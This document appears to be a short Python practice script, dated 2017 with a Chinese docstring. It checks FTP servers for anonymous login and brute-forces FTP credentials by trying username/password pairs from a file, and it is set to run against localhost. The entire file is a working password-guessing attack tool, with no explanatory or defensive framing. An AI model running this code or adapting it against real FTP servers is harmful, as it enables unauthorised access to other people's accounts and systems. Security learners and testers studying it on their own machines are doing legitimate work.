#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-07-09 12:10:36
# @Author  : Law Paul (peicx@outlook.com)
# @Link    : http://peicx.github.io
# @Version : $Id$

import ftplib


def anonLogin(hostname):
    '''查看网站是否允许匿名登陆FTP'''
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print('\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded.')
        ftp.quit()
        return True
    except Exception as e:
        print("\n[-] Fail " + str(hostname))
        return False


def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: ' + userName + '/' + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('\n[*] ' + str(hostname) +
                  ' FTP Logon Succeeded:' + userName + '/' + passWord)
            ftp.quit()
            return True
        except Exception as e:
            pass
    print("[-] No Found")
    return(None, None)


host = '127.0.0.1'
passwdFile = '1.txt'
bruteLogin(host, passwdFile)
